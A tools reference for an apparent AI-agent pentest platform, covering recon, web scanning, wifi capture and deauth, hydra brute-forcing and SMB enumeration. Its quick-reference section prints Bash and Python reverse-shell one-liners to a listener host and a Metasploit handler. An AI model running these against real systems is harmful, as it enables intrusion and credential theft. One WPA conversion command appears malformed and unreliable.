# Agent-Nimi: Complete Tools Reference
**Offensive Security Research Platform — Authorized Pentest Edition**

---

## Table of Contents
1. [OSINT Tools](#osint-tools)
2. [Network Scanning Tools](#network-scanning-tools)
3. [Web Application Testing](#web-application-testing)
4. [Wireless Tools](#wireless-tools)
5. [Exploitation Tools](#exploitation-tools)
6. [Password Attack Tools](#password-attack-tools)
7. [SMB/NetBIOS Tools](#smbnetbios-tools)
8. [Quick Reference Commands](#quick-reference-commands)

---

## OSINT Tools

### web_search
**Description**: Search the web using DuckDuckGo for OSINT, CVE research, tool documentation, and target reconnaissance.

**API Key**: Not required

**Usage**:
```python
web_search(query="CVE-2024-1234 exploit", max_results=8)
web_search(query="site:github.com privilege escalation linux")
```

**Command Line Equivalent**:
```bash
# Manual DuckDuckGo searches via curl
curl -s "https://api.duckduckgo.com/?q=CVE-2024-1234&format=json"
```

**References**:
- DuckDuckGo API: https://api.duckduckgo.com/
- Location: `/home/nimi/agent-nimi/tools/osint_tools.py:36-122`

---

### cve_lookup
**Description**: Query NIST NVD database for CVE details including CVSS scores, vectors, descriptions, and references.

**API Key**: Not required

**Usage**:
```python
# By CVE ID
cve_lookup(cve_id="CVE-2021-44228")

# By keyword
cve_lookup(keyword="apache log4j", max_results=5)
```

**Command Line Equivalent**:
```bash
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"
```

**References**:
- NIST NVD API: https://nvd.nist.gov/developers/vulnerabilities
- Location: `/home/nimi/agent-nimi/tools/osint_tools.py:126-201`

---

### github_search
**Description**: Search GitHub for repositories, code, exploits, and security tools.

**API Key**: Optional (increases rate limits from 10/min to 60/min)

**Usage**:
```python
# Search repositories
github_search(query="wordpress exploit", search_type="repositories", max_results=6)

# Search code for specific vulnerabilities
github_search(query="SQL injection", search_type="code", max_results=10)

# Search issues
github_search(query="CVE-2024 PoC", search_type="issues")
```

**Command Line Equivalent**:
```bash
# Repository search
curl -H "Accept: application/vnd.github+json" \
  "https://api.github.com/search/repositories?q=wordpress+exploit&sort=stars"

# Code search
curl -H "Accept: application/vnd.github+json" \
  "https://api.github.com/search/code?q=SQL+injection"
```

**References**:
- GitHub Search API: https://docs.github.com/en/rest/search
- Location: `/home/nimi/agent-nimi/tools/osint_tools.py:204-267`

---

### shodan_host
**Description**: Query Shodan for port/service/banner data and vulnerability information.

**API Key**: Required (free at https://account.shodan.io/)

**Configuration**:
```python
# Set via environment variable
export SHODAN_API_KEY="your_api_key_here"

# Or in config
config = {"shodan": {"api_key": "your_api_key_here"}}
```

**Usage**:
```python
shodan_host(host="192.168.1.1")
shodan_host(host="example.com", config=config)
```

**Command Line Equivalent**:
```bash
curl "https://api.shodan.io/shodan/host/192.168.1.1?key=YOUR_API_KEY"
```

**References**:
- Shodan API: https://developer.shodan.io/api
- Location: `/home/nimi/agent-nimi/tools/osint_tools.py:270-362`

---

### whois_lookup
**Description**: Domain/IP registration and ownership information via WHOIS/RDAP.

**API Key**: Not required

**Usage**:
```python
whois_lookup(target="example.com")
whois_lookup(target="8.8.8.8")
```

**Command Line Equivalent**:
```bash
whois example.com
whois 8.8.8.8

# RDAP fallback
curl -s "https://rdap.org/domain/example.com"
```

**References**:
- WHOIS protocol: RFC 3912
- RDAP: https://rdap.org/
- Location: `/home/nimi/agent-nimi/tools/osint_tools.py:365-447`

---

## Network Scanning Tools

### nmap_scan
**Description**: Network mapper for port scanning, service detection, and vulnerability assessment.

**Installation**: `apt install nmap`

**Usage**:
```python
# Quick scan (top 1000 ports)
nmap_scan(target="192.168.1.0/24", scan_type="quick")

# Full port scan
nmap_scan(target="10.10.10.5", scan_type="full")

# Vulnerability scan
nmap_scan(target="example.com", scan_type="vuln")

# Stealth scan
nmap_scan(target="192.168.1.1", scan_type="stealth")

# UDP scan
nmap_scan(target="10.0.0.1", scan_type="udp")

# Custom ports
nmap_scan(target="10.10.10.5", ports="22,80,443,8080", extra_args="-A")
```

**Scan Types**:
- `quick`: `-sV -T4 --top-ports 1000`
- `full`: `-sV -sC -p- -T4`
- `vuln`: `-sV --script vuln`
- `stealth`: `-sS -T2 -f --data-length 24`
- `udp`: `-sU -T4 --top-ports 200`

**Command Line Reference**:
```bash
# Service version detection
nmap -sV -T4 --top-ports 1000 192.168.1.0/24

# All ports + scripts
nmap -sV -sC -p- -T4 10.10.10.5

# Vulnerability scan
nmap -sV --script vuln example.com

# Stealth SYN scan
nmap -sS -T2 -f --data-length 24 192.168.1.1

# UDP scan
nmap -sU -T4 --top-ports 200 10.0.0.1

# OS detection
nmap -O -A 10.10.10.5
```

**References**:
- Nmap Docs: https://nmap.org/docs.html
- NSE Scripts: https://nmap.org/nsedoc/
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:20-42`

---

## Web Application Testing

### nikto_scan
**Description**: Web server vulnerability scanner (6700+ potentially dangerous files/programs).

**Installation**: `apt install nikto`

**Usage**:
```python
nikto_scan(target="https://example.com")
nikto_scan(target="http://10.10.10.5:8080", extra_args="-Tuning 123")
```

**Command Line Reference**:
```bash
# Full scan
nikto -h https://example.com -C all

# Tuned scan (1=interesting files, 2=misconfig, 3=info disclosure)
nikto -h http://target.com -Tuning 123

# SSL scan
nikto -h https://target.com -ssl

# Save output
nikto -h https://target.com -o nikto_results.txt
```

**Tuning Options**:
- 1: Interesting Files
- 2: Misconfiguration / Default Files
- 3: Information Disclosure
- 4: Injection (XSS/Script/HTML)
- 5: Remote File Retrieval
- 6: Denial of Service
- 7: Remote File Retrieval (Server Wide)
- 8: Command Execution / Remote Shell
- 9: SQL Injection

**References**:
- Nikto GitHub: https://github.com/sullo/nikto
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:45-53`

---

### gobuster_scan
**Description**: Directory/file brute-forcing tool for web enumeration.

**Installation**: `apt install gobuster`

**Usage**:
```python
# Default wordlist
gobuster_scan(target="http://example.com")

# Custom wordlist
gobuster_scan(
    target="https://10.10.10.5",
    wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
)

# Extra args
gobuster_scan(
    target="http://target.com",
    extra_args="-x php,html,txt -s 200,204,301,302,307"
)
```

**Command Line Reference**:
```bash
# Basic directory scan
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 50

# With file extensions
gobuster dir -u http://example.com -w /path/to/wordlist -x php,html,txt

# Status code filtering
gobuster dir -u http://example.com -w /path/to/wordlist -s 200,204,301,302,307

# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Vhost enumeration
gobuster vhost -u http://example.com -w /path/to/wordlist
```

**Common Wordlists**:
```bash
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

**References**:
- Gobuster GitHub: https://github.com/OJ/gobuster
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:56-64`

---

## Wireless Tools

### wifi_monitor_start
**Description**: Enable monitor mode on WiFi interface for packet capture.

**Installation**: `apt install aircrack-ng`

**Usage**:
```python
# Start monitor mode (auto-detects interface name)
wifi_monitor_start(interface="wlan1")
```

**Command Line Reference**:
```bash
# Check for interfering processes and kill
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan1

# Verify monitor mode
iw dev wlan1mon info
# OR
iwconfig wlan1mon

# List wireless interfaces
iw dev
airmon-ng
```

**References**:
- Aircrack-ng: https://www.aircrack-ng.org/
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:141-200`

---

### wifi_capture
**Description**: Capture WiFi traffic and handshakes using airodump-ng.

**Installation**: `apt install aircrack-ng`

**Usage**:
```python
wifi_capture(
    monitor_interface="wlan1mon",
    bssid="00:11:22:33:44:55",
    channel=6,
    output_file="/tmp/capture",
    duration=60
)
```

**Command Line Reference**:
```bash
# Scan for networks
airodump-ng wlan1mon

# Capture on specific BSSID/channel
airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan1mon -w /tmp/capture --output-format pcap

# Timed capture (60 seconds)
timeout 60 airodump-ng -c 6 --bssid 00:11:22:33:44:55 wlan1mon -w /tmp/capture

# Deauth attack (force handshake)
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan1mon
```

**Crack WPA/WPA2 Handshake**:
```bash
# Using aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Using hashcat (faster)
hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
```

**References**:
- Airodump-ng: https://www.aircrack-ng.org/doku.php?id=airodump-ng
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:203-248`

---

### wifi_monitor_stop
**Description**: Disable monitor mode and restore normal networking.

**Usage**:
```python
wifi_monitor_stop(monitor_interface="wlan1mon")
```

**Command Line Reference**:
```bash
# Stop monitor mode
airmon-ng stop wlan1mon

# Restart NetworkManager
systemctl restart NetworkManager

# Verify connectivity
ping -c 3 1.1.1.1
```

**References**:
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:251-279`

---

## Exploitation Tools

### searchsploit
**Description**: Search Exploit Database for known exploits and vulnerabilities.

**Installation**: `apt install exploitdb`

**Usage**:
```python
searchsploit(query="apache 2.4.49")
searchsploit(query="windows privilege escalation")
```

**Command Line Reference**:
```bash
# Basic search
searchsploit apache

# Filter by platform
searchsploit linux kernel 3.2 --exclude="(PoC)"

# Case-insensitive
searchsploit -c apache

# Exact match
searchsploit -e "Linux Kernel 2.6"

# Web search
searchsploit -w apache

# Copy exploit to current directory
searchsploit -m 1337

# Path to exploit
searchsploit -p 1337

# Update database
searchsploit -u

# JSON output
searchsploit --json apache
```

**References**:
- ExploitDB: https://www.exploit-db.com/
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:67-75`

---

## Password Attack Tools

### hydra_bruteforce
**Description**: Fast network logon cracker supporting multiple protocols.

**Installation**: `apt install hydra`

**Usage**:
```python
hydra_bruteforce(
    target="10.10.10.5",
    service="ssh",
    userlist="/usr/share/wordlists/metasploit/unix_users.txt",
    passlist="/usr/share/wordlists/rockyou.txt",
    extra_args="-t 4"
)

# HTTP POST form
hydra_bruteforce(
    target="example.com",
    service="http-post-form",
    userlist="users.txt",
    passlist="pass.txt",
    extra_args='"/login:username=^USER^&password=^PASS^:F=incorrect"'
)
```

**Command Line Reference**:
```bash
# SSH brute-force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh -t 4

# FTP brute-force
hydra -l admin -P passwords.txt ftp://192.168.1.1

# HTTP Basic Auth
hydra -l admin -P passwords.txt 10.10.10.5 http-get /admin

# HTTP POST form
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# MySQL brute-force
hydra -L users.txt -P passwords.txt 10.10.10.5 mysql

# RDP brute-force
hydra -L users.txt -P passwords.txt rdp://192.168.1.100

# SMB brute-force
hydra -L users.txt -P passwords.txt 10.10.10.5 smb
```

**Supported Services**:
ssh, ftp, http-get, http-post, http-post-form, https-get, https-post, mysql, mssql, postgres, rdp, smb, smtp, telnet, vnc

**References**:
- Hydra GitHub: https://github.com/vanhauser-thc/thc-hydra
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:78-86`

---

## SMB/NetBIOS Tools

### enum4linux
**Description**: SMB/NetBIOS enumeration tool for Windows/Samba systems.

**Installation**: `apt install enum4linux enum4linux-ng`

**Usage**:
```python
enum4linux_scan(target="10.10.10.5")
enum4linux_scan(target="192.168.1.100", extra_args="-U -S")
```

**Command Line Reference**:
```bash
# All enumeration
enum4linux -a 10.10.10.5

# User enumeration
enum4linux -U 10.10.10.5

# Share enumeration
enum4linux -S 10.10.10.5

# Password policy
enum4linux -P 10.10.10.5

# Group enumeration
enum4linux -G 10.10.10.5

# Modern version (enum4linux-ng)
enum4linux-ng -A 10.10.10.5

# With credentials
enum4linux -u administrator -p password 10.10.10.5
```

**Manual SMB Enumeration**:
```bash
# List shares (smbclient)
smbclient -L //10.10.10.5 -N

# Connect to share
smbclient //10.10.10.5/share_name -U username

# Mount SMB share
mount -t cifs //10.10.10.5/share /mnt/share -o username=user,password=pass

# RPCclient enumeration
rpcclient -U "" -N 10.10.10.5
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 0x1f4

# Nmap SMB scripts
nmap -p445 --script smb-enum-shares,smb-enum-users 10.10.10.5
```

**References**:
- enum4linux: https://github.com/CiscoCXSecurity/enum4linux
- enum4linux-ng: https://github.com/cddmp/enum4linux-ng
- Location: `/home/nimi/agent-nimi/tools/security_tools.py:89-99`

---

## Quick Reference Commands

### Reconnaissance
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Fast port scan
nmap -F 10.10.10.5

# Service enumeration
nmap -sV -sC -p- 10.10.10.5

# DNS enumeration
dnsenum example.com
dnsrecon -d example.com -t std
dig axfr @ns1.example.com example.com

# Subdomain brute-force
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Web Application
```bash
# Directory enumeration
dirb http://example.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# Web vulnerability scan
nikto -h https://example.com

# SQL injection test
sqlmap -u "http://example.com/page?id=1" --batch --dbs

# Web fuzzing
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt http://example.com/FUZZ
```

### Password Attacks
```bash
# ZIP cracking
fcrackzip -D -p /usr/share/wordlists/rockyou.txt file.zip

# Hash cracking (hashcat)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Exploitation
```bash
# Metasploit
msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run

# Reverse shell (Bash)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Privilege Escalation
```bash
# Linux enumeration
./linpeas.sh
./LinEnum.sh

# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo rights
sudo -l

# Kernel exploits
searchsploit linux kernel $(uname -r)

# Windows enumeration
.\winPEAS.exe
.\PowerUp.ps1
Invoke-AllChecks
```

---

## Tool Installation Quick Reference

### Kali Linux (Default)
Most tools pre-installed:
```bash
apt update && apt install -y \
  nmap nikto gobuster hydra enum4linux \
  aircrack-ng exploitdb metasploit-framework \
  sqlmap wfuzz hashcat john
```

### Ubuntu/Debian
```bash
# OSINT
apt install whois dnsutils

# Scanning
apt install nmap masscan

# Web
apt install nikto dirb gobuster wfuzz sqlmap

# Wireless
apt install aircrack-ng reaver

# Password
apt install hydra john hashcat

# Exploitation
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod +x msfinstall && ./msfinstall
```

### Python Dependencies
```bash
pip install requests shodan python-whois
```

---

## References & Documentation

### Official Documentation
- **Nmap**: https://nmap.org/book/man.html
- **Nikto**: https://github.com/sullo/nikto/wiki
- **Gobuster**: https://github.com/OJ/gobuster
- **Hydra**: https://github.com/vanhauser-thc/thc-hydra
- **Aircrack-ng**: https://www.aircrack-ng.org/documentation.html
- **ExploitDB**: https://www.exploit-db.com/
- **Metasploit**: https://docs.rapid7.com/metasploit/

### Wordlists
```bash
# SecLists (comprehensive)
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists

# RockYou
gunzip /usr/share/wordlists/rockyou.txt.gz

# Common locations
/usr/share/wordlists/
/usr/share/seclists/
/usr/share/dirb/wordlists/
/usr/share/metasploit-framework/data/wordlists/
```

### CVE & Exploit Databases
- **NIST NVD**: https://nvd.nist.gov/
- **MITRE CVE**: https://cve.mitre.org/
- **ExploitDB**: https://www.exploit-db.com/
- **Packet Storm**: https://packetstormsecurity.com/
- **0day.today**: https://0day.today/

### OSINT Resources
- **Shodan**: https://www.shodan.io/
- **Censys**: https://search.censys.io/
- **GitHub Search**: https://github.com/search
- **SecurityTrails**: https://securitytrails.com/
- **VirusTotal**: https://www.virustotal.com/

---

## Agent-Nimi Architecture References

### Core Files
- **OSINT Tools**: `/home/nimi/agent-nimi/tools/osint_tools.py`
- **Security Tools**: `/home/nimi/agent-nimi/tools/security_tools.py`
- **Shell Tools**: `/home/nimi/agent-nimi/tools/shell_tools.py`
- **Tool Registry**: `/home/nimi/agent-nimi/tools/registry.py`
- **Database Schema**: `/home/nimi/agent-nimi/pentest_db_schema.sql`

### Configuration
```python
# Example config.py structure
config = {
    "shodan": {
        "api_key": "YOUR_SHODAN_API_KEY"
    },
    "github": {
        "token": "ghp_YOUR_GITHUB_TOKEN"
    }
}
```

---

**Last Updated**: 2026-03-31  
**Platform**: Agent-Nimi v1.0  
**License**: Authorized Pentest Use Only  
